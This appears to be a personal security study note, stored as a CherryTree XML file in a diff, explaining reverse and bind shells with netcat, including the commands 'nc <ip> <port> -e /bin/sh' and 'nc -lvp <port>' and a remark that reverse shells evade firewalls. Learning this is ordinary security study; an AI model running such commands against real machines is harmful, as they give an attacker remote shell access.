@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node name="Shell Connections" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706963106" ts_lastsave="1706963648">
+    <rich_text>Shell connections can be made using various tools to open and connect to a port, ex: </rich_text>
+    <rich_text link="node 42">netcat</rich_text>
+    <rich_text>
+1)Reverse Shells: Open a port in target machine and have it connect to us, this is preferred since firewalls don't really block outgoing connections. 
+ex: A</rich_text>
+    <rich_text weight="heavy">ttacker side</rich_text>
+    <rich_text>= nc -lvp(open port and listen to connections) &lt;port&gt;(port number to open), 
+target machine=nc &lt;ip&gt; &lt;port&gt; -e(execute) /bin/sh (to execute shell on target machine once connection established, i.e get a shell access of target machine on attack machine)
+
+2)Bind Shell: Attacker connects to the machine, hence has to bypass firewall also. ex: attacker= nc &lt;ip&gt; &lt;port&gt; (connect to target machine), target= nc -lvp &lt;port&gt; -e /bin/sh (open port, listen for connections and execute shell over that connection once established)</rich_text>
+  </node>
+</cherrytree>
